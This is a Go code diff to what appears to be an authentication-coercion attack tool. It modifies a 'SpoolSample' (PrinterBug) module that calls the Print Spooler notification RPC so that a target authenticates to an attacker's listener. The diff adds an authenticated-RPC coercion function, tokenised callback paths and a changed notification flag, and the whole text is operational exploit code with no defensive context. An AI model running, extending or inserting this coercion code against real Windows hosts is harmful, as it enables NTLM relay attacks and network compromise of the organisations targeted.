@@ -37,7 +37,6 @@ func (s *SpoolSample) InterfaceVersion() uint32 {
 func (s *SpoolSample) Opnums() []OpnumInfo {
 	return []OpnumInfo{
 		{65, "RpcRemoteFindFirstPrinterChangeNotificationEx", "Primary notification coercion"},
-		{62, "RpcRemoteFindFirstPrinterChangeNotification", "Legacy notification coercion"},
 	}
 }
 
@@ -62,7 +61,7 @@ func (s *SpoolSample) Coerce(ctx context.Context, rpc *dcerpc.Client, listener s
 
 	// Step 2: Call notification function
 	opnums := s.getOpnums(opts)
-	path := buildCallbackPath(listener, opts.UseHTTP, opts.HTTPPort)
+	path, _ := BuildCallbackPathWithToken(listener, opts.UseHTTP, opts.HTTPPort, "spool", opts.Token)
 
 	var lastErr error
 	for _, opnum := range opnums {
@@ -77,6 +76,43 @@ func (s *SpoolSample) Coerce(ctx context.Context, rpc *dcerpc.Client, listener s
 			continue
 		}
 		return nil // Success
+	}
+
+	return lastErr
+}
+
+// CoerceAuth uses authenticated RPC (PKT_PRIVACY) for coercion
+func (s *SpoolSample) CoerceAuth(ctx context.Context, rpc *AuthenticatedClient, listener string, opts CoerceOptions) error {
+	// Step 1: Open printer handle
+	openStub := s.createOpenPrinterStub("")
+
+	resp, err := rpc.Call(1, openStub)
+	if err != nil {
+		return err
+	}
+
+	if len(resp) < 20 {
+		return dcerpc.ErrCallFailed
+	}
+	printerHandle := resp[:20]
+
+	// Step 2: Call notification function
+	opnums := s.getOpnums(opts)
+	path, _ := BuildCallbackPathWithToken(listener, opts.UseHTTP, opts.HTTPPort, "spool", opts.Token)
+
+	var lastErr error
+	for _, opnum := range opnums {
+		stub := s.createNotificationStub(printerHandle, path, opnum.Opnum)
+		_, err := rpc.Call(opnum.Opnum, stub)
+
+		if err != nil {
+			if isCoercionSuccess(err) {
+				return nil
+			}
+			lastErr = err
+			continue
+		}
+		return nil
 	}
 
 	return lastErr
@@ -125,8 +161,8 @@ func (s *SpoolSample) createNotificationStub(printerHandle []byte, listener stri
 	// hPrinter (20 bytes handle)
 	w.WriteBytes(printerHandle)
 
-	// fdwFlags
-	w.WriteUint32(0)
+	// fdwFlags - PRINTER_CHANGE_ADD_JOB = 0x00000100
+	w.WriteUint32(0x00000100)
 
 	// fdwOptions
 	w.WriteUint32(0)
